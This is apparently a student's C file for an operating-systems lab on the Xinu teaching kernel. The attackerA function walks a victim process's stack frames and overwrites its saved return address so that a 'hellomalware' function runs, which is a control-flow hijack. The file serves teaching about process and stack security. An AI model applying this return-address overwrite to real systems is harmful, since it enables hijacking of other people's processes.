/* attackerA.c - attackerA */

#include <xinu.h>

/*------------------------------------------------------------------------
 *  attackerA  -  Lab 4, Section 4.2. Induces malware code into a healthy process
 *------------------------------------------------------------------------
 */
void attackerA(
	  int		y		/* Integer input to attack specific pid	*/
	)
{
        intmask mask;                   /* Saved interrupt mask         */
    


	void hellomalware(void);	
	pid32	pid;
	pid32	mpid; // Malware pid - never runs

	pid = getpid() - y; // victim pid
	struct procent *prptr;
//	struct procent *mprptr;

        mask = disable();
        if (isbadpid(pid)) {
                restore(mask);
                return SYSERR;
        }

        prptr = &proctab[pid]; // Process table pointer for victim's process

        int stkframes = 3; // Number of nested function calls while calling sleepms()

        unsigned int * retaddr = prptr->prstkbase; // Search through base pointers to find return address
        unsigned int * prevbaseptr = prptr->prstkbase; // Search through base pointers to find return address
                    
        while (stkframes > 0) { // Loop through to find third stack frame return address
                while (*retaddr != prevbaseptr) {
                        retaddr = retaddr - 1;
                }   
                prevbaseptr = retaddr;
                stkframes = stkframes - 1;
        }   

        retaddr = retaddr + 1; // Copy return address one below base pointer

        *(retaddr) = &hellomalware + 3; // Replace return address with function's address

        restore(mask);          /* Restore interrupts */

/*
	mpid = create(hellomalware, 8192, 20, "malware", 0);
	prptr = &proctab[pid]; // Process table pointer for victim's process
	mprptr = &proctab[mpid]; // Process table pointer for malware's process
	prptr->prstkptr = mprptr->prstkptr; // Point return address of victim's to malware
	restore(mask);
*/
}
